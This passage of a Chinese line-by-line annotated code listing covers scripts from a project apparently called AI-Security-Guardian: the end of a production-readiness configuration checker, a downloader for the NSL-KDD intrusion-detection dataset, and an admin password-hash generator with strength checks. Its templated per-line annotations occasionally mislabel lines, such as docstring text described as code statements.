| 250 | 条件判断：满足条件时进入对应分支。 | `    if not log_dir.is_dir():` |
| 251 | 返回结果：把处理后的值交回调用方。 | `        return CheckResult("LOG_DIR", False, f"not a directory: {log_dir}")` |
| 252 | 条件判断：满足条件时进入对应分支。 | `    if not os.access(log_dir, os.W_OK):` |
| 253 | 返回结果：把处理后的值交回调用方。 | `        return CheckResult("LOG_DIR", False, f"directory is not writable: {log_dir}")` |
| 254 | 返回结果：把处理后的值交回调用方。 | `    return CheckResult("LOG_DIR", True, f"directory exists and is writable: {log_dir}")` |
| 255 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 256 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 257 | 函数定义：声明 `_checks` 的输入、处理逻辑和返回结果。 | `def _checks() -> Iterable[Callable[[], CheckResult]]:` |
| 258 | 返回结果：把处理后的值交回调用方。 | `    return (` |
| 259 | 代码语句：参与当前文件的业务流程或数据处理。 | `        check_flask_env,` |
| 260 | 代码语句：参与当前文件的业务流程或数据处理。 | `        check_secret_key,` |
| 261 | 代码语句：参与当前文件的业务流程或数据处理。 | `        check_admin_password_hash,` |
| 262 | 代码语句：参与当前文件的业务流程或数据处理。 | `        check_plain_admin_password,` |
| 263 | 代码语句：参与当前文件的业务流程或数据处理。 | `        check_database_url,` |
| 264 | 代码语句：参与当前文件的业务流程或数据处理。 | `        check_redis_password,` |
| 265 | 代码语句：参与当前文件的业务流程或数据处理。 | `        check_allowed_origins,` |
| 266 | 代码语句：参与当前文件的业务流程或数据处理。 | `        check_dry_run,` |
| 267 | 代码语句：参与当前文件的业务流程或数据处理。 | `        check_model_dir,` |
| 268 | 代码语句：参与当前文件的业务流程或数据处理。 | `        check_log_integrity,` |
| 269 | 代码语句：参与当前文件的业务流程或数据处理。 | `        check_log_dir,` |
| 270 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 271 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 272 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 273 | 函数定义：声明 `main` 的输入、处理逻辑和返回结果。 | `def main(argv: list[str] \| None = None) -> int:` |
| 274 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    parser = argparse.ArgumentParser(` |
| 275 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        description="Validate AI-Security-Guardian production configuration."` |
| 276 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 277 | 函数调用：执行已有函数/方法完成当前步骤。 | `    parser.add_argument(` |
| 278 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "--env-file",` |
| 279 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        default=str(ROOT / ".env"),` |
| 280 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        help="optional env file to read without overriding existing variables (default: .env)",` |
| 281 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 282 | 函数调用：执行已有函数/方法完成当前步骤。 | `    parser.add_argument(` |
| 283 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "--skip-env-file",` |
| 284 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        action="store_true",` |
| 285 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        help="use only the current process environment",` |
| 286 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 287 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    args = parser.parse_args(argv)` |
| 288 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 289 | 条件判断：满足条件时进入对应分支。 | `    if not args.skip_env_file:` |
| 290 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        env_path = Path(args.env_file)` |
| 291 | 条件判断：满足条件时进入对应分支。 | `        if not env_path.is_absolute():` |
| 292 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            env_path = ROOT / env_path` |
| 293 | 异常保护：尝试执行可能失败的逻辑。 | `        try:` |
| 294 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            loaded = _load_env_file(env_path)` |
| 295 | 异常处理：捕获错误并执行降级或记录逻辑。 | `        except RuntimeError as exc:` |
| 296 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            print(f"[FAIL] ENV_FILE: {exc}")` |
| 297 | 返回结果：把处理后的值交回调用方。 | `            return 1` |
| 298 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        print(f"Env file: {env_path} ({loaded} value(s) loaded, existing env preserved)")` |
| 299 | 兜底分支：处理前面条件都不满足的情况。 | `    else:` |
| 300 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        print("Env file: skipped")` |
| 301 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 302 | 函数调用：执行已有函数/方法完成当前步骤。 | `    print("AI-Security-Guardian production readiness check")` |
| 303 | 函数调用：执行已有函数/方法完成当前步骤。 | `    print("-" * 56)` |
| 304 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 305 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    results = [check() for check in _checks()]` |
| 306 | 循环：逐个处理集合或迭代器中的元素。 | `    for result in results:` |
| 307 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        status = "PASS" if result.ok else "FAIL"` |
| 308 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        print(f"[{status}] {result.name}: {result.reason}")` |
| 309 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 310 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    failures = [result for result in results if not result.ok]` |
| 311 | 函数调用：执行已有函数/方法完成当前步骤。 | `    print("-" * 56)` |
| 312 | 条件判断：满足条件时进入对应分支。 | `    if failures:` |
| 313 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        print(f"Result: FAIL ({len(failures)} issue(s))")` |
| 314 | 返回结果：把处理后的值交回调用方。 | `        return 1` |
| 315 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 316 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    print("Result: PASS")` |
| 317 | 返回结果：把处理后的值交回调用方。 | `    return 0` |
| 318 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 319 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 320 | 条件判断：满足条件时进入对应分支。 | `if __name__ == "__main__":` |
| 321 | 抛出异常：主动报告不可继续的错误。 | `    raise SystemExit(main())` |

## `scripts/download_datasets.py`

- 类型：运维/训练脚本
- 行数：117

| 行号 | 备注 | 原始代码 |
|---:|---|---|
| 1 | 文档字符串边界：开始或结束模块/类/函数说明。 | `"""` |
| 2 | 代码语句：参与当前文件的业务流程或数据处理。 | `数据集下载脚本（Step 3.1）` |
| 3 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 4 | 代码语句：参与当前文件的业务流程或数据处理。 | `对应架构文档：§11.4 模型训练管道 - 数据准备阶段` |
| 5 | 代码语句：参与当前文件的业务流程或数据处理。 | `对应 Phase 3 提示词：Step 3.1 下载训练数据集` |
| 6 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 7 | 代码语句：参与当前文件的业务流程或数据处理。 | `功能：` |
| 8 | 代码语句：参与当前文件的业务流程或数据处理。 | `    - 自动下载 NSL-KDD 训练集（KDDTrain+.txt）与测试集（KDDTest+.txt）` |
| 9 | 代码语句：参与当前文件的业务流程或数据处理。 | `    - 对 CSIC 2010（Web 攻击）与 CICIDS2017（DDoS）给出手动下载提示` |
| 10 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 11 | 代码语句：参与当前文件的业务流程或数据处理。 | `安全要求：` |
| 12 | 函数调用：执行已有函数/方法完成当前步骤。 | `    - 不使用 os.system()/subprocess 执行动态 shell 命令` |
| 13 | 函数调用：执行已有函数/方法完成当前步骤。 | `    - 使用 os.path.join() 拼接路径，禁止字符串拼接` |
| 14 | 代码语句：参与当前文件的业务流程或数据处理。 | `    - 下载过程带超时 + 异常处理` |
| 15 | 代码语句：参与当前文件的业务流程或数据处理。 | `    - 保存前校验目标目录存在` |
| 16 | 文档字符串边界：开始或结束模块/类/函数说明。 | `"""` |
| 17 | 兼容性导入：启用较新的 Python 语义。 | `from __future__ import annotations` |
| 18 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 19 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import hashlib` |
| 20 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import os` |
| 21 | 导入对象：从指定模块引入类、函数或常量。 | `from typing import Dict, List` |
| 22 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 23 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import requests` |
| 24 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 25 | 注释：解释下面或当前这段代码的设计意图。 | `# ===== 数据集镜像配置 =====` |
| 26 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `NSL_KDD_BASE_URL = "https://raw.githubusercontent.com/defcom17/NSL_KDD/master"` |
| 27 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `NSL_KDD_FILES: List[str] = ["KDDTrain+.txt", "KDDTest+.txt"]` |
| 28 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 29 | 注释：解释下面或当前这段代码的设计意图。 | `# 目标保存目录（相对项目根目录）` |
| 30 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `DATASET_DIR: str = os.path.join("data", "datasets")` |
| 31 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 32 | 注释：解释下面或当前这段代码的设计意图。 | `# 单次下载超时（秒）` |
| 33 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `REQUEST_TIMEOUT: int = 60` |
| 34 | 注释：解释下面或当前这段代码的设计意图。 | `# 分块大小` |
| 35 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `CHUNK_SIZE: int = 64 * 1024` |
| 36 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 37 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 38 | 函数定义：声明 `_ensure_dir` 的输入、处理逻辑和返回结果。 | `def _ensure_dir(path: str) -> None:` |
| 39 | 文档字符串：说明当前模块、类或函数的职责。 | `    """确保目录存在。"""` |
| 40 | 函数调用：执行已有函数/方法完成当前步骤。 | `    os.makedirs(path, exist_ok=True)` |
| 41 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 42 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 43 | 函数定义：声明 `_download_file` 的输入、处理逻辑和返回结果。 | `def _download_file(url: str, dest: str) -> bool:` |
| 44 | 文档字符串边界：开始或结束模块/类/函数说明。 | `    """` |
| 45 | 代码语句：参与当前文件的业务流程或数据处理。 | `    下载单个文件到指定路径。` |
| 46 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 47 | 代码语句：参与当前文件的业务流程或数据处理。 | `    Args:` |
| 48 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        url: 资源 URL` |
| 49 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        dest: 目标文件绝对/相对路径` |
| 50 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 51 | 代码语句：参与当前文件的业务流程或数据处理。 | `    Returns:` |
| 52 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        bool: 下载是否成功` |
| 53 | 文档字符串边界：开始或结束模块/类/函数说明。 | `    """` |
| 54 | 条件判断：满足条件时进入对应分支。 | `    if os.path.exists(dest) and os.path.getsize(dest) > 0:` |
| 55 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        print(f"[跳过] 文件已存在: {dest}")` |
| 56 | 返回结果：把处理后的值交回调用方。 | `        return True` |
| 57 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 58 | 异常保护：尝试执行可能失败的逻辑。 | `    try:` |
| 59 | 函数调用：执行已有函数/方法完成当前步骤。 | `        print(f"[下载] {url} -> {dest}")` |
| 60 | 上下文管理：自动管理资源打开与释放。 | `        with requests.get(url, stream=True, timeout=REQUEST_TIMEOUT) as resp:` |
| 61 | 函数调用：执行已有函数/方法完成当前步骤。 | `            resp.raise_for_status()` |
| 62 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            tmp_path = dest + ".part"` |
| 63 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            sha = hashlib.sha256()` |
| 64 | 上下文管理：自动管理资源打开与释放。 | `            with open(tmp_path, "wb") as f:` |
| 65 | 循环：逐个处理集合或迭代器中的元素。 | `                for chunk in resp.iter_content(chunk_size=CHUNK_SIZE):` |
| 66 | 条件判断：满足条件时进入对应分支。 | `                    if not chunk:` |
| 67 | 继续循环：跳过本轮剩余逻辑。 | `                        continue` |
| 68 | 函数调用：执行已有函数/方法完成当前步骤。 | `                    f.write(chunk)` |
| 69 | 函数调用：执行已有函数/方法完成当前步骤。 | `                    sha.update(chunk)` |
| 70 | 函数调用：执行已有函数/方法完成当前步骤。 | `            os.replace(tmp_path, dest)` |
| 71 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        size_mb = os.path.getsize(dest) / (1024 * 1024)` |
| 72 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        print(f"[完成] {os.path.basename(dest)}: {size_mb:.2f} MB, sha256={sha.hexdigest()[:16]}…")` |
| 73 | 返回结果：把处理后的值交回调用方。 | `        return True` |
| 74 | 异常处理：捕获错误并执行降级或记录逻辑。 | `    except requests.exceptions.Timeout:` |
| 75 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        print(f"[错误] 下载超时: {url}")` |
| 76 | 异常处理：捕获错误并执行降级或记录逻辑。 | `    except requests.exceptions.RequestException as exc:` |
| 77 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        print(f"[错误] 下载失败: {url} - {exc}")` |
| 78 | 异常处理：捕获错误并执行降级或记录逻辑。 | `    except OSError as exc:` |
| 79 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        print(f"[错误] 写入失败: {dest} - {exc}")` |
| 80 | 返回结果：把处理后的值交回调用方。 | `    return False` |
| 81 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 82 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 83 | 函数定义：声明 `download_nsl_kdd` 的输入、处理逻辑和返回结果。 | `def download_nsl_kdd() -> Dict[str, bool]:` |
| 84 | 文档字符串：说明当前模块、类或函数的职责。 | `    """下载 NSL-KDD 数据集（用于 DDoS / 入侵检测训练）。"""` |
| 85 | 函数调用：执行已有函数/方法完成当前步骤。 | `    _ensure_dir(DATASET_DIR)` |
| 86 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    results: Dict[str, bool] = {}` |
| 87 | 循环：逐个处理集合或迭代器中的元素。 | `    for filename in NSL_KDD_FILES:` |
| 88 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        url = f"{NSL_KDD_BASE_URL}/{filename}"` |
| 89 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        dest = os.path.join(DATASET_DIR, filename)` |
| 90 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        results[filename] = _download_file(url, dest)` |
| 91 | 返回结果：把处理后的值交回调用方。 | `    return results` |
| 92 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 93 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 94 | 函数定义：声明 `print_manual_datasets` 的输入、处理逻辑和返回结果。 | `def print_manual_datasets() -> None:` |
| 95 | 文档字符串：说明当前模块、类或函数的职责。 | `    """CSIC 2010 与 CICIDS2017 需手动下载，打印提示信息。"""` |
| 96 | 函数调用：执行已有函数/方法完成当前步骤。 | `    print("\n=== 以下数据集需要手动下载（版权/表单限制）===")` |
| 97 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    print("  - CSIC 2010（Web 攻击）: https://www.isi.csic.es/dataset/")` |
| 98 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    print("  - CICIDS2017（DDoS）   : https://www.unb.ca/cic/datasets/ids-2017.html")` |
| 99 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    print(f"  请下载后解压到: {DATASET_DIR}/")` |
| 100 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 101 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 102 | 函数定义：声明 `main` 的输入、处理逻辑和返回结果。 | `def main() -> None:` |
| 103 | 函数调用：执行已有函数/方法完成当前步骤。 | `    print("=" * 50)` |
| 104 | 函数调用：执行已有函数/方法完成当前步骤。 | `    print("Step 3.1 数据集下载")` |
| 105 | 函数调用：执行已有函数/方法完成当前步骤。 | `    print("=" * 50)` |
| 106 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 107 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    results = download_nsl_kdd()` |
| 108 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    ok_count = sum(1 for v in results.values() if v)` |
| 109 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    print(f"\nNSL-KDD 下载结果: {ok_count}/{len(results)} 成功")` |
| 110 | 循环：逐个处理集合或迭代器中的元素。 | `    for name, ok in results.items():` |
| 111 | 函数调用：执行已有函数/方法完成当前步骤。 | `        print(f"  [{'OK' if ok else 'FAIL'}] {name}")` |
| 112 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 113 | 函数调用：执行已有函数/方法完成当前步骤。 | `    print_manual_datasets()` |
| 114 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 115 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 116 | 条件判断：满足条件时进入对应分支。 | `if __name__ == "__main__":` |
| 117 | 函数调用：执行已有函数/方法完成当前步骤。 | `    main()` |

## `scripts/generate_admin_password_hash.py`

- 类型：运维/训练脚本
- 行数：116

| 行号 | 备注 | 原始代码 |
|---:|---|---|
| 1 | 文档字符串：说明当前模块、类或函数的职责。 | `"""生成管理员密码的 Werkzeug 安全哈希（Phase 8）。` |
| 2 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 3 | 代码语句：参与当前文件的业务流程或数据处理。 | `使用：` |
| 4 | 代码语句：参与当前文件的业务流程或数据处理。 | `    python scripts/generate_admin_password_hash.py            交互式输入` |
| 5 | 代码语句：参与当前文件的业务流程或数据处理。 | `    python scripts/generate_admin_password_hash.py -p secret  命令行传入（不推荐，会进 shell history）` |
| 6 | 代码语句：参与当前文件的业务流程或数据处理。 | `    echo -n 'secret' \| python scripts/generate_admin_password_hash.py --stdin` |
| 7 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 8 | 代码语句：参与当前文件的业务流程或数据处理。 | `输出形如：` |
| 9 | 代码语句：参与当前文件的业务流程或数据处理。 | `    pbkdf2:sha256:600000$SALT$HASH` |
| 10 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 11 | 代码语句：参与当前文件的业务流程或数据处理。 | `将结果写入 \`.env\`：` |
| 12 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    ADMIN_PASSWORD_HASH=pbkdf2:sha256:600000$SALT$HASH` |
| 13 | 代码语句：参与当前文件的业务流程或数据处理。 | `并删除旧的 \`ADMIN_PASSWORD\` 明文配置。` |
| 14 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 15 | 代码语句：参与当前文件的业务流程或数据处理。 | `安全注意事项：` |
| 16 | 代码语句：参与当前文件的业务流程或数据处理。 | `    - 不要把明文密码写入 git / 聊天记录 / Prompt` |
| 17 | 代码语句：参与当前文件的业务流程或数据处理。 | `    - 建议使用至少 12 位、含大小写 + 数字 + 符号的强密码` |
| 18 | 代码语句：参与当前文件的业务流程或数据处理。 | `    - 部署后强烈建议立即撤销本次生成哈希时所使用的 shell 历史（history -c 或清理 pwsh 历史）` |
| 19 | 文档字符串边界：开始或结束模块/类/函数说明。 | `"""` |
| 20 | 兼容性导入：启用较新的 Python 语义。 | `from __future__ import annotations` |
| 21 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 22 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import argparse` |
| 23 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import getpass` |
| 24 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import os` |
| 25 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import sys` |
| 26 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 27 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 28 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `MIN_PASSWORD_LENGTH = 12` |
| 29 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 30 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 31 | 函数定义：声明 `_check_strength` 的输入、处理逻辑和返回结果。 | `def _check_strength(password: str) -> list[str]:` |
| 32 | 文档字符串：说明当前模块、类或函数的职责。 | `    """返回一组弱点提示；空列表表示满足推荐强度。"""` |
| 33 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    issues: list[str] = []` |
| 34 | 条件判断：满足条件时进入对应分支。 | `    if len(password) < MIN_PASSWORD_LENGTH:` |
| 35 | 函数调用：执行已有函数/方法完成当前步骤。 | `        issues.append(f"长度应不少于 {MIN_PASSWORD_LENGTH} 位")` |
| 36 | 条件判断：满足条件时进入对应分支。 | `    if password.lower() == password:` |
| 37 | 函数调用：执行已有函数/方法完成当前步骤。 | `        issues.append("缺少大写字母")` |
| 38 | 条件判断：满足条件时进入对应分支。 | `    if password.upper() == password:` |
| 39 | 函数调用：执行已有函数/方法完成当前步骤。 | `        issues.append("缺少小写字母")` |
| 40 | 条件判断：满足条件时进入对应分支。 | `    if not any(c.isdigit() for c in password):` |
| 41 | 函数调用：执行已有函数/方法完成当前步骤。 | `        issues.append("缺少数字")` |
| 42 | 条件判断：满足条件时进入对应分支。 | `    if password.isalnum():` |
| 43 | 函数调用：执行已有函数/方法完成当前步骤。 | `        issues.append("缺少符号（如 !@#$）")` |
| 44 | 返回结果：把处理后的值交回调用方。 | `    return issues` |
| 45 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 46 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 47 | 函数定义：声明 `_read_password` 的输入、处理逻辑和返回结果。 | `def _read_password(args: argparse.Namespace) -> str:` |
| 48 | 条件判断：满足条件时进入对应分支。 | `    if args.stdin:` |
| 49 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        data = sys.stdin.read()` |
| 50 | 注释：解释下面或当前这段代码的设计意图。 | `        # 允许末尾换行但保留中间字符` |
| 51 | 返回结果：把处理后的值交回调用方。 | `        return data.rstrip("\r\n")` |
| 52 | 条件判断：满足条件时进入对应分支。 | `    if args.password is not None:` |
| 53 | 返回结果：把处理后的值交回调用方。 | `        return args.password` |
| 54 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 55 | 注释：解释下面或当前这段代码的设计意图。 | `    # 交互式输入 + 二次确认` |
| 56 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    pwd1 = getpass.getpass("请输入管理员密码: ")` |
| 57 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    pwd2 = getpass.getpass("请再次输入确认: ")` |
| 58 | 条件判断：满足条件时进入对应分支。 | `    if pwd1 != pwd2:` |
| 59 | 函数调用：执行已有函数/方法完成当前步骤。 | `        print("两次输入不一致。", file=sys.stderr)` |
| 60 | 函数调用：执行已有函数/方法完成当前步骤。 | `        sys.exit(2)` |
| 61 | 返回结果：把处理后的值交回调用方。 | `    return pwd1` |
| 62 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 63 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 64 | 函数定义：声明 `main` 的输入、处理逻辑和返回结果。 | `def main() -> int:` |
| 65 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    parser = argparse.ArgumentParser(` |
| 66 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        description="生成管理员密码的 Werkzeug 安全哈希"` |
| 67 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 68 | 函数调用：执行已有函数/方法完成当前步骤。 | `    parser.add_argument(` |
| 69 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "-p", "--password",` |
| 70 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        help="命令行直接传入密码（会进 shell history，仅自动化场景使用）",` |
| 71 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 72 | 函数调用：执行已有函数/方法完成当前步骤。 | `    parser.add_argument(` |
| 73 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "--stdin", action="store_true",` |
| 74 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        help="从标准输入读取密码（推荐配合 echo -n 或管道使用）",` |
| 75 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 76 | 函数调用：执行已有函数/方法完成当前步骤。 | `    parser.add_argument(` |
| 77 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "--algorithm",` |
| 78 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        default="pbkdf2:sha256:600000",` |
| 79 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        help="哈希算法，默认 pbkdf2:sha256:600000",` |
| 80 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 81 | 函数调用：执行已有函数/方法完成当前步骤。 | `    parser.add_argument(` |
| 82 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "--force",` |
| 83 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        action="store_true",` |
| 84 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        help="允许弱密码（仅开发环境使用；默认拒绝）",` |
| 85 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 86 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    args = parser.parse_args()` |
| 87 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 88 | 注释：解释下面或当前这段代码的设计意图。 | `    # 保证可以 from src.utils.auth import hash_password` |
| 89 | 函数调用：执行已有函数/方法完成当前步骤。 | `    sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))` |
| 90 | 导入对象：从指定模块引入类、函数或常量。 | `    from src.utils.auth import hash_password  # noqa: WPS433` |
| 91 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 92 | 占位语句：保持语法完整但当前不执行操作。 | `    password = _read_password(args)` |
| 93 | 条件判断：满足条件时进入对应分支。 | `    if not password:` |
| 94 | 函数调用：执行已有函数/方法完成当前步骤。 | `        print("密码不能为空。", file=sys.stderr)` |
| 95 | 返回结果：把处理后的值交回调用方。 | `        return 2` |
| 96 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 97 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    issues = _check_strength(password)` |
| 98 | 条件判断：满足条件时进入对应分支。 | `    if issues and not args.force:` |
| 99 | 函数调用：执行已有函数/方法完成当前步骤。 | `        print("密码强度不足：", file=sys.stderr)` |
| 100 | 循环：逐个处理集合或迭代器中的元素。 | `        for item in issues:` |
| 101 | 函数调用：执行已有函数/方法完成当前步骤。 | `            print(f"  - {item}", file=sys.stderr)` |
| 102 | 函数调用：执行已有函数/方法完成当前步骤。 | `        print(` |
| 103 | 代码语句：参与当前文件的业务流程或数据处理。 | `            "\n如确认要使用弱密码（仅限开发环境），追加 --force 重新运行。",` |
| 104 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            file=sys.stderr,` |
| 105 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 106 | 返回结果：把处理后的值交回调用方。 | `        return 3` |
| 107 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 108 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    digest = hash_password(password, algorithm=args.algorithm)` |
| 109 | 函数调用：执行已有函数/方法完成当前步骤。 | `    print("\n请将以下一行写入 .env 文件 (并删除旧的 ADMIN_PASSWORD)：\n")` |
| 110 | 函数调用：执行已有函数/方法完成当前步骤。 | `    print(f"ADMIN_PASSWORD_HASH={digest}")` |
| 111 | 函数调用：执行已有函数/方法完成当前步骤。 | `    print("\n提示：该哈希无法从输出反推原始密码；同一密码每次生成的哈希都不同。")` |
| 112 | 返回结果：把处理后的值交回调用方。 | `    return 0` |
